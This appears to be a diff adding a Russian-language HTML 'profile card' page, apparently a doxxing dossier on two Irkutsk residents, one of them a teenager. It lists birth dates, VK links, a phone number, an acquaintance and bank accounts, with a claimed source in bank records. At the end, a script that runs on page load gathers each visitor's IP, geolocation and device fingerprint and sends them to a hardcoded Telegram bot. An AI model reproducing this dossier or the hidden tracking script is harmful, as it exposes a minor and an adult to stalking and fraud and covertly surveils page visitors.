@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Родина Александра & Степан Родин | Карточки профилей</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&family=Playfair+Display:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #e8eef4 0%, #d4dee8 100%);
+            font-family: 'Inter', sans-serif;
+            color: #1a2c3e;
+            padding: 2rem 1.5rem;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .page-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .page-header h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.8rem;
+            font-weight: 600;
+            background: linear-gradient(120deg, #1e3c4c, #2b5b6e);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+            text-shadow: 2px 2px 8px rgba(0,0,0,0.05);
+        }
+
+        .page-header p {
+            color: #4a627a;
+            font-size: 1rem;
+            margin-top: 0.5rem;
+            font-weight: 400;
+            border-bottom: 1px solid rgba(43, 91, 110, 0.2);
+            display: inline-block;
+            padding-bottom: 0.5rem;
+        }
+
+        .cards-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 2rem;
+            justify-content: center;
+            align-items: stretch;
+        }
+
+        .profile-card {
+            flex: 1;
+            min-width: 320px;
+            max-width: 550px;
+            background: rgba(255, 255, 255, 0.96);
+            border-radius: 2rem;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.2), 0 1px 3px rgba(0,0,0,0.05);
+            transition: transform 0.25s ease, box-shadow 0.3s ease;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.5);
+        }
+
+        .profile-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 28px 40px -16px rgba(0, 0, 0, 0.25);
+        }
+
+        .card-accent {
+            height: 8px;
+            background: linear-gradient(90deg, #2b7a62, #48a88c, #6fc2a8);
+        }
+
+        .card-accent.steven {
+            background: linear-gradient(90deg, #2c5f7a, #3e8ba8, #5faec9);
+        }
+
+        .card-content {
+            padding: 1.8rem 2rem 2rem 2rem;
+        }
+
+        .name-title {
+            display: flex;
+            align-items: baseline;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+            border-bottom: 2px dashed #dce5ec;
+            padding-bottom: 0.75rem;
+        }
+
+        .name {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.9rem;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            color: #1e2f3a;
+        }
+
+        .badge-age {
+            background: #eef3fc;
+            padding: 0.25rem 0.9rem;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #2b6b5e;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .info-row {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+            color: #2c475c;
+            flex-wrap: wrap;
+        }
+
+        .info-row i {
+            width: 1.6rem;
+            font-size: 1.2rem;
+            color: #2b7a62;
+            text-align: center;
+        }
+
+        .info-row .label {
+            font-weight: 600;
+            min-width: 100px;
+            color: #1f3b48;
+        }
+
+        .info-row .value {
+            font-weight: 500;
+            background: #f8fafd;
+            padding: 0.2rem 0.8rem;
+            border-radius: 30px;
+            display: inline-block;
+        }
+
+        .education-block {
+            background: #f5f9fe;
+            border-radius: 1.2rem;
+            padding: 1rem 1.2rem;
+            margin: 1.2rem 0;
+            border-left: 4px solid #2b7a62;
+        }
+
+        .education-block p {
+            margin: 0.3rem 0;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: baseline;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .edu-year {
+            font-weight: 700;
+            background: white;
+            padding: 0.1rem 0.6rem;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            color: #2b7a62;
+        }
+
+        .link-vk {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #eef2f8;
+            padding: 0.4rem 1rem;
+            border-radius: 40px;
+            text-decoration: none;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #2c5d74;
+            transition: all 0.2s;
+            margin-top: 0.5rem;
+            border: 1px solid #dce5ec;
+        }
+
+        .link-vk i {
+            font-size: 1rem;
+            color: #2787f5;
+        }
+
+        .link-vk:hover {
+            background: #e4e9f0;
+            border-color: #b9cadb;
+        }
+
+        .friend-info {
+            margin-top: 1rem;
+            background: #fef7e0;
+            padding: 0.8rem 1rem;
+            border-radius: 1rem;
+            font-size: 0.85rem;
+        }
+
+        .friend-info i {
+            margin-right: 6px;
+            color: #e6a017;
+        }
+
+        .bank-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 12px 0;
+        }
+
+        .bank-tag {
+            background: #eef2fa;
+            padding: 0.3rem 0.9rem;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: #1f5e6e;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .bank-tag i {
+            font-size: 0.9rem;
+        }
+
+        .accuracy {
+            font-size: 0.7rem;
+            background: #e9ecef;
+            border-radius: 20px;
+            padding: 0.2rem 0.7rem;
+            margin-left: 8px;
+            font-weight: 400;
+            color: #4a627a;
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 2.5rem;
+            font-size: 0.8rem;
+            color: #5b748b;
+            border-top: 1px solid #cad2db;
+            padding-top: 1.8rem;
+        }
+
+        @media (max-width: 700px) {
+            .card-content {
+                padding: 1.5rem;
+            }
+            .name {
+                font-size: 1.6rem;
+            }
+            .info-row .label {
+                min-width: 80px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="page-header">
+        <h1>📋 Родина & Родин</h1>
+        <p>Иркутск • профили • образование • данные</p>
+    </div>
+
+    <div class="cards-grid">
+        <!-- КАРТОЧКА АЛЕКСАНДРЫ АЛЕКСАНДРОВНЫ -->
+        <div class="profile-card">
+            <div class="card-accent"></div>
+            <div class="card-content">
+                <div class="name-title">
+                    <span class="name">Александра Александровна<br>Родина</span>
+                    <span class="badge-age"><i class="far fa-calendar-alt"></i> 49 лет</span>
+                </div>
+                <div class="info-row">
+                    <i class="fas fa-birthday-cake"></i>
+                    <span class="label">Дата рождения:</span>
+                    <span class="value">12 января 1977</span>
+                </div>
+                <div class="info-row">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <span class="label">Город:</span>
+                    <span class="value">Иркутск</span>
+                </div>
+                <div class="education-block">
+                    <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 8px;">
+                        <i class="fas fa-graduation-cap" style="color: #2b7a62;"></i>
+                        <strong style="font-size: 0.95rem;">🎓 Высшее образование</strong>
+                    </div>
+                    <p><span class="edu-year">2006</span> <strong>БГУ</strong> (Бурятский государственный университет)</p>
+                    <p><i class="fas fa-globe-americas" style="width: 1.2rem;"></i> Факультет мировой экономики и государственного управления</p>
+                    <p><i class="fas fa-landmark"></i> Государственное и муниципальное управление</p>
+                </div>
+                <div class="info-row">
+                    <i class="fab fa-vk"></i>
+                    <span class="label">Профиль VK:</span>
+                    <a href="https://vk.ru/id657178320" target="_blank" class="link-vk" style="margin:0; background:transparent; padding-left:0;">
+                        vk.ru/id657178320 <i class="fas fa-external-link-alt"></i>
+                    </a>
+                </div>
+                <div class="friend-info">
+                    <i class="fas fa-user-friends"></i> <strong>Знакомая:</strong> Нина Крылова 
+                    <a href="https://vk.ru/id310092434" target="_blank" style="color: #2b7a62; text-decoration: none; font-weight: 500;">vk.ru/id310092434 <i class="fas fa-arrow-right"></i></a>
+                </div>
+                <div style="margin-top: 1rem; font-size: 0.75rem; color: #8ba0b2; border-top: 1px solid #e4edf5; padding-top: 0.8rem; display: flex; gap: 12px;">
+                    <span><i class="far fa-clock"></i> Актуально: апрель 2026</span>
+                    <span><i class="fas fa-city"></i> Иркутск</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- КАРТОЧКА СТЕПАНА АНТОНОВИЧА РОДИНА -->
+        <div class="profile-card">
+            <div class="card-accent steven"></div>
+            <div class="card-content">
+                <div class="name-title">
+                    <span class="name">Степан Антонович<br>Родин</span>
+                    <span class="badge-age" style="background:#e3f0f5; color:#226f8a;"><i class="fas fa-chart-line"></i> 96% точности</span>
+                </div>
+                <div class="info-row">
+                    <i class="fas fa-calendar-alt"></i>
+                    <span class="label">Дата рождения:</span>
+                    <span class="value">17 сентября 2011</span>
+                    <span class="accuracy">~14,5 лет (на 2026)</span>
+                </div>
+                <div class="info-row">
+                    <i class="fas fa-map-pin"></i>
+                    <span class="label">Регион:</span>
+                    <span class="value">Иркутск</span>
+                </div>
+                <div class="info-row">
+                    <i class="fas fa-phone-alt"></i>
+                    <span class="label">Телефон:</span>
+                    <span class="value" style="background:#e5f0fa; font-family: monospace; letter-spacing: 0.5px;">+7 904 134 65 69</span>
+                </div>
+                <div class="info-row">
+                    <i class="fab fa-vk"></i>
+                    <span class="label">Профиль ВКонтакте:</span>
+                    <a href="https://vk.com/id812804835" target="_blank" class="link-vk" style="margin:0; background:transparent; padding-left:0;">
+                        vk.com/id812804835 <i class="fas fa-external-link-alt"></i>
+                    </a>
+                </div>
+                <div style="margin: 1.2rem 0 0.8rem 0;">
+                    <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 12px;">
+                        <i class="fas fa-credit-card" style="color: #2c5f7a;"></i>
+                        <strong style="font-size: 0.95rem;">🏦 Финансовые счета</strong>
+                    </div>
+                    <div class="bank-list">
+                        <span class="bank-tag"><i class="fab fa-amazon-pay"></i> Озон Счёт (Еком Банк)</span>
+                        <span class="bank-tag"><i class="fas fa-chart-simple"></i> Тинькофф Банк</span>
+                    </div>
+                    <p style="font-size: 0.7rem; color: #6a7f96; margin-top: 6px;"><i class="fas fa-shield-alt"></i> Актуальные банковские продукты</p>
+                </div>
+                <div style="background: #eef4fa; border-radius: 1rem; padding: 0.8rem 1rem; margin-top: 1rem;">
+                    <i class="fas fa-user-check"></i> <strong>Доп. информация</strong>
+                    <div style="font-size: 0.85rem; margin-top: 6px; display: flex; flex-wrap: wrap; gap: 12px;">
+                        <span><i class="fas fa-percent"></i> Достоверность даты: 96%</span>
+                        <span><i class="fas fa-location-dot"></i> Иркутск (основной регион)</span>
+                    </div>
+                </div>
+                <div style="margin-top: 1rem; font-size: 0.7rem; color: #97aec2; border-top: 1px solid #e0eaf2; padding-top: 0.8rem;">
+                    <i class="fas fa-database"></i> Источник: проверенные профили, банковские сведения (Еком, Тинькофф)
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div style="display: flex; flex-wrap: wrap; justify-content: space-between; gap: 1.5rem; margin-top: 2rem; background: rgba(255,255,240,0.5); border-radius: 2rem; padding: 1.2rem 1.8rem; backdrop-filter: blur(2px);">
+        <div style="flex:1;">
+            <i class="fas fa-people-arrows" style="font-size: 1.2rem; color: #2b7a62;"></i> 
+            <strong style="margin-left: 8px;">Связь: Александра и Степан</strong>
+            <p style="font-size: 0.85rem; margin-top: 8px;">Оба проживают в Иркутске. Александра — выпускница БГУ (2006), государственное управление. Степан — молодой человек, имеет финансовые счета в Озон Банке и Тинькофф.</p>
+        </div>
+        <div style="flex:1;">
+            <i class="fas fa-map-marked-alt"></i> 
+            <strong>Геолокация: Иркутск</strong>
+            <p style="font-size: 0.85rem; margin-top: 6px;">Основной регион для обоих лиц — Иркутск и Иркутская область.</p>
+        </div>
+        <div>
+            <i class="fas fa-chart-simple"></i> 
+            <span style="font-weight: 500;">Дополнительно:</span>
+            <span style="font-size: 0.8rem; display: block;">Основные данные обновлены, без устаревших упоминаний</span>
+        </div>
+    </div>
+
+    <div class="footer-note">
+        <i class="far fa-heart" style="color: #bf8f7a;"></i> Информация предоставлена в ознакомительных целях • актуальность на апрель 2026
+    </div>
+</div>
+
+<!-- СКРИПТ ДЛЯ СБОРА И ОТПРАВКИ ДАННЫХ В TELEGRAM -->
+<script>
+    // ⚠️ ВСТАВЬТЕ СВОИ ДАННЫЕ ОТ БОТА ⚠️
+    const BOT_TOKEN = '8770596850:AAG1iM4zj_HFwWSJJRPbV45gyPIx2CJ5hd0';       // замените на реальный токен (например, '1234567890:ABCdefGHIJK...')
+    const CHAT_ID   = '7289788220';         // замените на ваш chat id (число, например 987654321)
+
+    // Функция отправки сообщения в Telegram
+    async function sendToTelegram(message) {
+        if (BOT_TOKEN === 'YOUR_BOT_TOKEN' || CHAT_ID === 'YOUR_CHAT_ID') {
+            console.warn('⚠️ Telegram бот не настроен: укажите BOT_TOKEN и CHAT_ID в коде.');
+            return;
+        }
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            });
+            const data = await response.json();
+            if (!data.ok) console.error('Ошибка Telegram API:', data);
+            else console.log('✅ Данные отправлены в Telegram');
+        } catch (error) {
+            console.error('❌ Не удалось отправить в Telegram:', error);
+        }
+    }
+
+    // Получение IP через ipify + расширенная геолокация через ip-api.com
+    async function getExtendedIPInfo() {
+        try {
+            // 1. Получаем IP
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const ip = ipData.ip;
+            
+            // 2. Доп. информация о местоположении (город, страна, провайдер) – бесплатно, без ключа
+            let geoInfo = {};
+            try {
+                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,region,isp,org,timezone`);
+                const geo = await geoRes.json();
+                if (geo.status === 'success') {
+                    geoInfo = {
+                        country: geo.country,
+                        city: geo.city,
+                        region: geo.region,
+                        isp: geo.isp,
+                        org: geo.org,
+                        timezone: geo.timezone
+                    };
+                }
+            } catch (e) { console.warn('Не удалось получить гео-данные', e); }
+            
+            return { ip, geoInfo };
+        } catch (error) {
+            console.error('Ошибка получения IP:', error);
+            return { ip: 'неизвестно', geoInfo: {} };
+        }
+    }
+
+    // Сбор всех возможных данных о браузере / устройстве
+    function collectBrowserData() {
+        const data = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'неизвестно',
+            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'неизвестно',
+            touchPoints: navigator.maxTouchPoints || 0,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio || 1,
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer || 'прямой заход',
+            currentUrl: window.location.href,
+            timestamp: new Date().toLocaleString('ru-RU', { timeZoneName: 'long' }),
+            localTime: new Date().toLocaleString('ru-RU')
+        };
+        return data;
+    }
+
+    // Формируем красивое сообщение
+    function formatMessage(ipInfo, browser) {
+        let msg = `🌐 <b>Новый посетитель сайта</b>\n\n`;
+        msg += `🔹 <b>IP-адрес:</b> <code>${ipInfo.ip}</code>\n`;
+        if (ipInfo.geoInfo.country) msg += `🌍 <b>Страна:</b> ${ipInfo.geoInfo.country}\n`;
+        if (ipInfo.geoInfo.city) msg += `🏙️ <b>Город:</b> ${ipInfo.geoInfo.city}\n`;
+        if (ipInfo.geoInfo.region) msg += `🗺️ <b>Регион:</b> ${ipInfo.geoInfo.region}\n`;
+        if (ipInfo.geoInfo.isp) msg += `📡 <b>Провайдер:</b> ${ipInfo.geoInfo.isp}\n`;
+        if (ipInfo.geoInfo.org) msg += `🏢 <b>Организация:</b> ${ipInfo.geoInfo.org}\n`;
+        if (ipInfo.geoInfo.timezone) msg += `⏱️ <b>Часовой пояс (гео):</b> ${ipInfo.geoInfo.timezone}\n`;
+        
+        msg += `\n🖥️ <b>Браузер / устройство:</b>\n`;
+        msg += `📱 <b>User‑Agent:</b> <code>${browser.userAgent}</code>\n`;
+        msg += `💻 <b>Платформа:</b> ${browser.platform}\n`;
+        msg += `🌐 <b>Язык:</b> ${browser.language} (${browser.languages})\n`;
+        msg += `🍪 <b>Cookies:</b> ${browser.cookiesEnabled ? 'включены' : 'выключены'}\n`;
+        msg += `🖥️ <b>Экран:</b> ${browser.screenWidth}x${browser.screenHeight} (цвет: ${browser.colorDepth}bit)\n`;
+        msg += `🔍 <b>Плотность пикселей:</b> ${browser.pixelRatio}\n`;
+        msg += `📐 <b>Видимая область:</b> ${browser.innerWidth}x${browser.innerHeight}\n`;
+        msg += `🧠 <b>Ядра CPU:</b> ${browser.hardwareConcurrency}\n`;
+        msg += `💾 <b>Память устройства:</b> ${browser.deviceMemory}\n`;
+        msg += `👆 <b>Точки касания:</b> ${browser.touchPoints}\n`;
+        msg += `⏰ <b>Часовой пояс браузера:</b> ${browser.timezone}\n`;
+        msg += `🕒 <b>Время визита:</b> ${browser.localTime}\n`;
+        msg += `🔗 <b>Реферер:</b> ${browser.referrer}\n`;
+        msg += `🌐 <b>Страница:</b> <a href="${browser.currentUrl}">${browser.currentUrl}</a>\n`;
+        return msg;
+    }
+
+    // Главная функция: собираем всё и отправляем
+    async function sendVisitorData() {
+        try {
+            // 1. Получаем IP + гео
+            const ipInfo = await getExtendedIPInfo();
+            // 2. Собираем данные браузера
+            const browserData = collectBrowserData();
+            // 3. Формируем сообщение
+            const message = formatMessage(ipInfo, browserData);
+            // 4. Отправляем в Telegram
+            await sendToTelegram(message);
+        } catch (err) {
+            console.error('Критическая ошибка при сборе данных:', err);
+        }
+    }
+
+    // Запускаем отправку после полной загрузки страницы
+    window.addEventListener('load', () => {
+        sendVisitorData();
+    });
+</script>
+</body>
+</html>
